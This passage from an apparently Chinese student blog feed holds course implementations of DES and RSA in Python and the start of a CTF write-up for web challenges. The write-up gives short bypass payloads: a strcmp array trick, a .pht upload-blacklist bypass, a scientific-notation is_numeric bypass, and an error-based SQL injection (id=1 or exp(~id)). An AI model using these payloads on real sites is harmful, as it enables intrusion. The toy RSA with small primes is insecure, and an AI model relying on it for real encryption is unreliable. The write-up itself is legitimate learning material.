class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyPc1</span><span class="params">(str)</span>:</span>      <span class="comment">#PC1置换去掉奇偶校验</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc1:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leftMove</span><span class="params">(str,k)</span>:</span>        <span class="comment">#循环左移</span></span><br><span class="line">    <span class="keyword">return</span> str[k:]+str[:k]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyPc2</span><span class="params">(str)</span>:</span>         <span class="comment">#PC2压缩置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc2:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyGenerate</span><span class="params">(str)</span>:</span>     <span class="comment">#16轮，每轮生成48位轮密钥</span></span><br><span class="line">    keylist=[]</span><br><span class="line">    key_pc1=keyPc1(str)</span><br><span class="line">    key_c=key_pc1[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d=key_pc1[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> LS:</span><br><span class="line">        key_c=leftMove(key_c,i)</span><br><span class="line">        key_d=leftMove(key_d,i)</span><br><span class="line">        key_t=key_c+key_d</span><br><span class="line">        key_pc2=keyPc2(key_t)</span><br><span class="line">        keylist.append(key_pc2)</span><br><span class="line">    <span class="keyword">return</span> keylist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iP</span><span class="params">(str)</span>:</span>       <span class="comment">#IP置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeE</span><span class="params">(str)</span>:</span>           <span class="comment">#E盒压缩变换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeS</span><span class="params">(str)</span>:</span>    <span class="comment">#S盒压缩变换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        row=int(str[i*<span class="number">6</span>]+str[i*<span class="number">6</span>+<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        column=int(str[i*<span class="number">6</span>+<span class="number">1</span>:i*<span class="number">6</span>+<span class="number">4</span>],<span class="number">2</span>)</span><br><span class="line">        res+=bin(S[i][row][column])[<span class="number">2</span>:].zfill(<span class="number">4</span>)        <span class="comment">#6位变4位</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeP</span><span class="params">(str)</span>:</span>    <span class="comment">#P盒置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_iP</span><span class="params">(str)</span>:</span>          <span class="comment">#IP逆置换</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _ip:</span><br><span class="line">        res+=str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeF</span><span class="params">(str,key)</span>:</span></span><br><span class="line">    str_e=changeE(str)</span><br><span class="line">    str_xor=xor(str_e,key)</span><br><span class="line">    str_s=changeS(str_xor)</span><br><span class="line">    str_p=changeP(str_s)</span><br><span class="line">    <span class="keyword">return</span> str_p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span><span class="params">(plain,key)</span>:</span></span><br><span class="line">    plain_bin=str2bin(plain)</span><br><span class="line">    key_bin=str2bin(key)</span><br><span class="line">    keylist=keyGenerate(key_bin)</span><br><span class="line">    plain_ip=iP(plain_bin)</span><br><span class="line">    plain_left=plain_ip[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    plain_right=plain_ip[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        plain_temp=plain_right</span><br><span class="line">        plain_right=xor(plain_left,changeF(plain_right,keylist[i]))</span><br><span class="line">        plain_left=plain_temp</span><br><span class="line">    left_final=xor(plain_left,changeF(plain_right,keylist[<span class="number">15</span>]))</span><br><span class="line">    right_final=plain_right</span><br><span class="line">    plain_final=left_final+right_final</span><br><span class="line">    cipher=_iP(plain_final)</span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">8</span>):</span><br><span class="line">        res+=chr(int(cipher[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesDecrypt</span><span class="params">(cipher,key)</span>:</span></span><br><span class="line">    cipher_bin=str2bin(cipher)</span><br><span class="line">    key_bin=str2bin(key)</span><br><span class="line">    keylist=keyGenerate(key_bin)</span><br><span class="line">    cipher_ip=iP(cipher_bin)</span><br><span class="line">    cipher_left=cipher_ip[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    cipher_right=cipher_ip[<span class="number">32</span>:]</span><br><span class="line">    j=<span class="number">15</span></span><br><span class="line">    <span class="keyword">while</span> j&gt;<span class="number">0</span>:</span><br><span class="line">        cipher_temp = cipher_right</span><br><span class="line">        cipher_right=xor(cipher_left,changeF(cipher_right,keylist[j]))</span><br><span class="line">        cipher_left=cipher_temp</span><br><span class="line">        j-=<span class="number">1</span></span><br><span class="line">    left_final=xor(cipher_left,changeF(cipher_right,keylist[<span class="number">0</span>]))</span><br><span class="line">    right_final=cipher_right</span><br><span class="line">    cipher_final = left_final + right_final</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    cipher = _iP(cipher_final)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">8</span>):</span><br><span class="line">        res += chr(int(cipher[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    choice = input(<span class="string">"1.加密输1\n2.解密输2\n"</span>)</span><br><span class="line">    key = input(<span class="string">"输入key: "</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">        plain=input(<span class="string">"输入明文: "</span>)</span><br><span class="line">        cipher=DesEncrypt(plain,key)</span><br><span class="line">        print(cipher)</span><br><span class="line">        file=open(<span class="string">'DES_cipher.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line">        file.write(cipher.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        file.close()</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">        cipher=input(<span class="string">"输入密文: "</span>)</span><br><span class="line">        print(DesDecrypt(cipher,key))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"请输入1-3！\n"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DES思路&quot;&gt;&lt;a href=&quot;#DES思路&quot; class=&quot;headerlink&quot; title=&quot;DES思路&quot;&gt;&lt;/a&gt;DES思路&lt;/h1&gt;&lt;p&gt;1.首先输入64bit密钥&lt;br&gt;2.将64bit密钥经过PC-1盒变成56bit&lt;br&gt;3.将56bit分为C0和
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA实现</title>
    <link href="http://yoursite.com/2018/12/25/RSA/"/>
    <id>http://yoursite.com/2018/12/25/RSA/</id>
    <published>2018-12-24T16:00:00.000Z</published>
    <updated>2018-12-28T08:08:44.560Z</updated>
    
    <content type="html"><![CDATA[<p>  临近期末了，剩下Java和密码学两门课了，正好有密码学课程设计，借此机会记录自己写的算法，每写一个算法就当巩固之前的算法知识和信息安全数学基础的知识了。</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><ol><li>乘法逆元<br>如果ax≡1 (mod p),且gcd(a,p)=1（a与p互质），则称a关于模p的乘法逆元为x。</li><li>费马小定理<br>假如a是一个整数，p是一个质数，那么a^p - a是p的倍数，可以表示为<br>a^p≡a(mod p)<br>a^(p-1)≡1(mod p)</li><li>扩展欧几里得定理<br>ax+by=gcd(a,b)</li><li><p>逆元求解</p><ul><li>扩展欧几里得出发 ax≡1(mod m)—-&gt;  ax-my≡1</li><li>费马小定理 a^(p-1)≡1（mod p） —&gt;  a^(p-2)≡a^-1(mod p) <h1 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h1></li></ul></li><li>选择两个大素数p和q</li><li>计算n=pq。 </li><li>计算φ(n)=(p-1)(q-1)</li><li><strong>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，gcd(e,φ(n))=1</strong></li><li><strong>计算ed ≡ 1 (mod φ(n))    (e对于φ(n)的模反元素d)</strong></li><li>将n和e封装成公钥，n和d封装成私钥  (n,e)—-(n,d)<br>整个过程实际就是计算n e d的过程<br>这里用到欧拉函数的性质,由n==pq得出(p-1)(q-1)=φ(n)<h1 id="RSA算法可靠性"><a href="#RSA算法可靠性" class="headerlink" title="RSA算法可靠性"></a>RSA算法可靠性</h1>对于p,q,n,φ(n),e,d,在已知n和e能推到d吗?</li></ol><ul><li>ed=1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</li><li>φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</li><li>n=pq。只有将n因数分解，才能算出p和q。</li></ul><p>因此只有n可以被因数分解，d就可以算出，也就意味着私钥被破解.但是RSA就是基于大整数因式分解的难题.</p><h1 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h1><p>加密m^e ≡ c (mod n)   假如Alice向Bob发送m,用Bob的公钥(n,e)对m加密(m小于n)生成c发送给Bob,</p><p>解密c^d ≡ m (mod n)      Bob用私钥(n,d)对c进行解密</p><h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><ol><li>快速幂模算法</li><li>素性检测</li><li>扩展欧几里得求逆元</li><li>生成随机素数</li><li>产生n.e.d</li><li>加密解密</li></ol><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>后续复习补上……</p><hr><h1 id="RSA数字签名方案"><a href="#RSA数字签名方案" class="headerlink" title="RSA数字签名方案"></a>RSA数字签名方案</h1><p>私钥加密，公钥解密。</p><ol><li>密钥的生成（与加密系统一样）：<pre><code>公钥𝑃𝑘={𝑒,𝑛};私钥𝑆𝑘={𝑑}</code></pre></li><li>签名过程 (𝑑,𝑛)：用户A对消息𝑀∈𝑍_𝑛进行签名，计算<pre><code>𝑆=𝑆𝑖𝑔(𝐻(𝑀))=𝐻(𝑀)𝑑 𝑚𝑜𝑑 𝑛；</code></pre> 并将𝑆附在消息𝑀后</li><li>验证过程 (𝑒,𝑛)：<br>  给定(𝑀,𝑆)，𝑉𝑒𝑟(𝑀,𝑆)为真⟺<pre><code>𝐻(𝑀)=𝑆^𝑒  (𝑚𝑜𝑑 𝑛)成立</code></pre></li></ol><h1 id="RSA签名攻击"><a href="#RSA签名攻击" class="headerlink" title="RSA签名攻击"></a>RSA签名攻击</h1><ol><li>直接对消息签名，用A的公钥计算𝑋＝𝑌𝑒 𝑚𝑜𝑑 𝑛，于是便可以用𝒀伪造A对消息𝑿的签名（hash函数可抵御这种攻击）</li><li>已有签名进行攻击 𝑆𝑖𝑔(𝑀1𝑀2) = 𝑆𝑖𝑔(𝑀1)𝑆𝑖𝑔(𝑀2)</li><li>利用签名获得明文</li></ol><h1 id="贴代码"><a href="#贴代码" class="headerlink" title="贴代码"></a>贴代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#快速幂模运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastMod</span><span class="params">(b,e,n)</span>:</span></span><br><span class="line">    result=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span>(e&amp;<span class="number">1</span>)==<span class="number">1</span>:</span><br><span class="line">            result=(result*b)%n</span><br><span class="line">        e&gt;&gt;=<span class="number">1</span></span><br><span class="line">        b=(b*b)%n</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(fastMod(2537,224,13))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin素性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MillerPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    q=n<span class="number">-1</span></span><br><span class="line">    k=<span class="number">0</span></span><br><span class="line">    <span class="comment">#2^k*q==n-1</span></span><br><span class="line">    <span class="keyword">while</span> q%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">        q//=<span class="number">2</span></span><br><span class="line">    <span class="comment">#测试次数为8</span></span><br><span class="line">    <span class="keyword">for</span> trials <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        a=random.randrange(<span class="number">2</span>,n<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> fastMod(a,q,n)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"prime"</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,k):</span><br><span class="line">            <span class="keyword">if</span> fastMod(a,(<span class="number">2</span>**j)*q,n)==n<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"prime"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"composite"</span></span><br><span class="line"><span class="comment">#print(MillerPrime(166253697843677187137998267714778626751))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#欧几里得求逆元</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    (x, y, r) = ext_euclid(b, a%b)</span><br><span class="line">    tmp = x</span><br><span class="line">    x = y</span><br><span class="line">    y = tmp - (a//b) * y</span><br><span class="line">    <span class="keyword">return</span> (x, y, r)</span><br><span class="line"><span class="comment">#print(ext_euclid(47,30))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求最大公因子</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatePrime</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        temp=random.randrange(<span class="number">2</span>**<span class="number">64</span>,<span class="number">2</span>**<span class="number">68</span>)</span><br><span class="line">        <span class="keyword">if</span> temp%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> MillerPrime(temp)==<span class="string">"composite"</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateKey</span><span class="params">()</span>:</span></span><br><span class="line">    p=CreatePrime()</span><br><span class="line">    q=CreatePrime()</span><br><span class="line">    n=p * q</span><br><span class="line">    fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        temp=random.randrange(<span class="number">0</span>,<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(temp,fn)==<span class="number">1</span>:</span><br><span class="line">            e=temp</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    x,y,r=ext_euclid(fn,e)</span><br><span class="line">    d=y%fn</span><br><span class="line">    <span class="keyword">return</span> (n, e, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strtoint</span><span class="params">(message)</span>:</span></span><br><span class="line">    message = int(binascii.hexlify(message.encode(<span class="string">"utf-8"</span>)), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttostr</span><span class="params">(num)</span>:</span></span><br><span class="line">    num=hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(num)%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        num=<span class="string">'0'</span>+num</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(num.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> fastMod(m,e,n)</span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(c,d,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> fastMod(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    (n, e, d) = CreateKey()</span><br><span class="line">    print(<span class="string">"n:"</span>,n,<span class="string">"e:"</span>,e,<span class="string">"d:"</span>,d)</span><br><span class="line">    M1=strtoint(input(<span class="string">"输入明文:"</span>))</span><br><span class="line">    <span class="comment">#print(M1)</span></span><br><span class="line">    print(<span class="string">"加密:"</span>,Encrypt(M1,e,n))</span><br><span class="line">    print(<span class="string">"----------------------------------"</span>+<span class="string">"\n"</span>)</span><br><span class="line">    C2=int(input(<span class="string">"输入密文: "</span>))</span><br><span class="line">    M2=Decrypt(C2,d,n)</span><br><span class="line">    print(<span class="string">"解密: "</span>,inttostr(M2).decode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  临近期末了，剩下Java和密码学两门课了，正好有密码学课程设计，借此机会记录自己写的算法，每写一个算法就当巩固之前的算法知识和信息安全数学基础的知识了。&lt;/p&gt;
&lt;h1 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>中原工比赛</title>
    <link href="http://yoursite.com/2018/12/24/%E4%B8%AD%E5%8E%9F%E7%90%86%E5%B7%A5writeup/"/>
    <id>http://yoursite.com/2018/12/24/中原理工writeup/</id>
    <published>2018-12-23T16:00:00.000Z</published>
    <updated>2018-12-24T09:39:01.203Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>查看响应头发现tips:4he9e.txt<br><img src="https://i.imgur.com/Nee638w.png" alt=""><br>然后访问之后有段代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"***"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>strcmp传入数组与字符串比较时会返回0；<br>构造<code>?repo[]=1</code></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>常规上传<br>上传成功之后不回显路径。修改phtml,php5..等无果。<br>应该就是一个简单的黑名单检测。</p><p>最后使用pht绕过<br><img src="https://i.imgur.com/4Aytb8Q.png" alt=""></p><h1 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h1><p>代码审计<br>传参t得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span><br><span class="line">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后发现is_numeric()和int()。这里is_numeric检测变量是否为数字或数字字符串，可识别科学记数法，数字，十六进制。int不能处理十六进制。用科学记数法绕过<br><code>sleep=6e6</code></p><p><img src="https://i.imgur.com/dWIUjqY.png" alt=""></p><h1 id="惊鸿一笔，上官婉儿。"><a href="#惊鸿一笔，上官婉儿。" class="headerlink" title="惊鸿一笔，上官婉儿。"></a>惊鸿一笔，上官婉儿。</h1><p>测试诸如点的时候首先fuzz测试发现过滤了union,and等字符。<br>直接从information_schema爆库没有回显。<br>题目过滤掉了一般报错注入和关键词报错注</p><p>利用不常用函数<br><code>id=1 or exp(~id)</code></p><p>(exp此函数返回e(自然对数的底)到X次方的值)<br>报错出库名。<br>md5加密提交<br><img src="https://i.imgur.com/Ak1M6MO.png" alt=""></p><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span 